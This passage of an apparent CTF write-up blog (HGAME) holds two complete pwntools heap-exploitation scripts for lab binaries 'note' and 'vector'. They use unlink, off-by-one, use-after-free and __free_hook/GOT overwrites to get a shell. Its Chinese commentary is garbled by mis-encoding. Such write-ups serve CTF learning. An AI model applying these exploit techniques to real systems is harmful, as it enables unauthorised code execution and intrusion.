leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'size?\n>> '</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'content?\n>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
note <span class="token operator">=</span> <span class="token number">0x4040C0</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'chunk0'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'chunk1'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'protected_chunk'</span><span class="token punctuation">)</span>
<span class="token comment"># æ„é€  fake chunk</span>
pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>note<span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>note<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> pay<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>
<span class="token comment"># unlink </span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
plt_puts <span class="token operator">=</span> binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
got_free <span class="token operator">=</span> binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'plt_puts'</span><span class="token punctuation">,</span> plt_puts<span class="token punctuation">)</span>
<span class="token comment"># å®æ–½ unlink åçš„æŒ‡é’ˆè¦†ç›–</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_free<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
<span class="token comment"># edit(0, p64(plt_puts)[:-1] + b'\n')</span>
<span class="token comment"># delete(0)</span>


<span class="token comment"># å–å…³ä¹‹å‰çš„ unsortedbin</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'fake'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">b'fake'</span><span class="token punctuation">)</span>

<span class="token comment"># off by one</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk1'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk2'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">b'chunk3'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'protected_chunk'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">b'X'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment"># æ¨é€ main_arena, è¿™åœ°æ–¹ä¸ç†Ÿï¼Œè¿˜æ˜¯é€‰æ‹©è°ƒè¯•å‡ºæ¥çš„åç§»</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token comment"># æ”¹å˜ delete ä¸º puts</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>plt_puts<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
__malloc_hook <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">16</span>
lbase <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token comment"># æ”¹å˜ delete ä¸º system</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsystem<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>å®¹å™¨æ‰©å¼ å¯¼è‡´è¿­ä»£å™¨å¤±æ•ˆï¼Œè¿™é‡Œæˆ‘å¯èƒ½å™è¿°æœ‰é—®é¢˜ï¼Œæ²¡æœ‰å¾ˆä»”ç»†çš„åˆ†æã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407135659622.png" alt="image-20220407135659622"></p>
<p>å¯¼è‡´å®¹å™¨ä¸­å­˜åœ¨ä¸¤ä¸ªä¸€æ ·çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç° UAF äº†ï¼Œç”±äºæ˜¯ libc-2.31.so ï¼Œæ¥ä¸‹æ¥å¯ä»¥ç›´æ¥è¿›è¡Œä¸€æ³¢ fastbin attackã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> system
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vector'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>ori_index<span class="token punctuation">,</span> tar_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ori_index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">b'is this one your want to move? [1/0]\n>> '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'is this one your want to move? [1/0]\n>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'which index you want move to?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>tar_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'idx'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> 

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token number">0x100</span>
lsystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>

move<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:10'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'idx:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>
    
dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>lsystem<span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿˜æœ‰ final çš„é¢˜ç›®ï¼Œmark</p>
]]></content>
      <categories>
        <category>HGAME</category>
        <category>ç•™å‘</category>
      </categories>
